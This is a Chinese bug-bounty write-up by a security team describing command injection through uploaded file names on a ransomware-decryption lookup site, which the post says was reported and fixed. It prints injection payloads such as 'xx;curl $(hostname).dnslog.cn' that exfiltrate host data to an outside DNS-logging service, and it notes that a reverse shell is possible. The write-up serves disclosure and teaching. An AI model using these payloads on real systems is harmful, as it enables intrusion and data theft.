#  SRC挖掘实战之某勒索病毒解密平台命令执行   
 Khan安全团队   2024-09-22 16:38  
  
注：漏洞已经上报厂商并且已完成修复。目标：https://lesuobingdu.xxx.cn/
访问目标网站功能点居少，一般这种只有几个功能的单页很多人会忽略一些功能点![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0x4WrnYcwKzpjbDv42w6SibSUia5vCZuX3h8Sdia9vasdVicO6OjrgkerqF3LlXBKSWtyCC78fT3icQp6Q/640?wx_fmt=png "")  
  
  
分别测试查询和解密的功能，发现系统会将上传后的文件带入内部病毒库去查询，然后对比md5值或者识别文件内容来判断病毒再响应出解密的方案给用户![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0x4WrnYcwKzpjbDv42w6SibSrL1IA5gOxTXwnDeI8Rns2QVx54p173sfxhJaibjmyMk1SANqbqFKV7A/640?wx_fmt=png "")  
  
  
那么可以设想当上传后的文件被带入系统内部查询会发生什么
大可能会出现  
- SQL注入  
  
- 命令注入  
  
- DOS服务  
  
- 让内部系统宕机等问题![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0x4WrnYcwKzpjbDv42w6SibSpwLKzha87F5bXe6Hos6WqpMVRm4ibnw0vicZbrzdCSJBKrVg6rtuY2XA/640?wx_fmt=png "")  
  
  
而且上传抓包的同时。如果系统允许Content-Type被恶意修改成test/html 或者某些可执行JavaScript的操作并且返回路径的 大几率出现XSS  
## 命令注入验证：   
  
一般黑盒测试只能通过oob外带数据 来测试响应内容
在Windows中文件可以重命名特殊字符，本地新建任意文件 重命名为：x;wget dnslog.cn![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0x4WrnYcwKzpjbDv42w6SibS5SRibwhibsCL0TEagtS8bKXR5CYDD7vtgia2CNbsBNQawYnTyaLx3h5icQ/640?wx_fmt=png "")  
  
  
1.第一次我是使用了ping命令去执行dnslog的，没有问题的
2.后续发现这样好像证明不了命令执行，执行相关高风险命令又怕被风控。3.当目标成功执行命令后，在User-Agent标头会回显出来当时执行的相关命令的版本号![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0x4WrnYcwKzpjbDv42w6SibSAhBZLqrEQS0khsUbR6d4icibuRX330b6QQZshkz1VpmIYIVfoiaE5fPmQ/640?wx_fmt=png "")  
  
  
4.在目标网站测试，分别执行curl和wget回显版本号![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0x4WrnYcwKzpjbDv42w6SibSfMqYeJib0bPol4OWICbhF3ZzpNXCq4AcE1OcLTCHTQKnTgEMGeeE7XQ/640?wx_fmt=png "")  
![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0x4WrnYcwKzpjbDv42w6SibS4mO6VqfLOdAEKQRTeBlJxsRURrgctgczR4Mp3HuUKysh1jf4X4DxDQ/640?wx_fmt=png "")  
  
  
在这里基本可以确认命令执行了，但是没办法证明带来的危害，还需要进一步利用
猜测执行不到whoami之类的命令 大概率是内部由waf或者某些字符在查询的时候冲突了  
  
OOB数据外带的payload为：xxx;ping whoami.dnslog.cn![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0x4WrnYcwKzpjbDv42w6SibSTThib9PSwXXllOzOC1e8UsNtdshEQUeJMEopGGZly9lPS7Hv7sLEv7w/640?wx_fmt=png "")  
  
  
本地测试是可以的，但是目标站无法外带，测试后发现在反引号中的命令才会生效  
  
利用payload：xx;curl $(hostname).dnslog.cn  
  
$()可以用做命令替换 相当于截取括号里面的命令
然后利用curl 传输$()内容到dnslog日志中![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0x4WrnYcwKzpjbDv42w6SibSHxTUY8PBuTuKLAVTZpvy7qInibECLI82hjGb4nBTcW5OVAfztcqZL8Q/640?wx_fmt=png "")  
  
  
最后即可完成命令执行，通过命令执行可以反弹shell  
  
  
